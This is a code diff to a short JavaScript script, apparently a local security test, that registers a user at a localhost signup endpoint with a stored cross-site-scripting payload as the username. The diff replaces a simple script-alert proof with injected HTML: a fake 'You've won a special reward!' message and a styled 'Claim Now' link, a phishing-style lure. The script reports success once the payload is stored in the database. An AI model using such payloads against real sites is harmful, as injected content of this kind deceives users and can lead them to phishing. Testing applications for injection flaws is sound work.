@@ -4,8 +4,8 @@ const SERVER_URL = 'http://localhost:5000';
 
 async function createMaliciousUser() {
   try {
-    const xssPayload = 'user123<script>alert("XSS")</script>';
-    
+    const xssPayload = `<h1>Congratulations!</h1><p>You\'ve won a special reward!</p><a href=\"https://www.linkedin.com/\" style=\"display:inline-block;background-color:#0077B5;color:white;padding:15px 30px;text-decoration:none;font-size:18px;border-radius:5px;margin-top:20px\" target=\"_blank\">Claim Now</a></div>`;
+
     const payload = {
       username: xssPayload,
       password: "password123"
@@ -15,10 +15,10 @@ async function createMaliciousUser() {
     console.log('Payload:', payload);
 
     const response = await axios.post(`${SERVER_URL}/api/users/signup`, payload);
-    
+
     console.log('Signup Response Status:', response.status);
     console.log('Signup Response Data:', response.data);
-    
+
     if (response.status === 200) {
       console.log('Malicious user created successfully! XSS payload stored in database.');
       return payload;
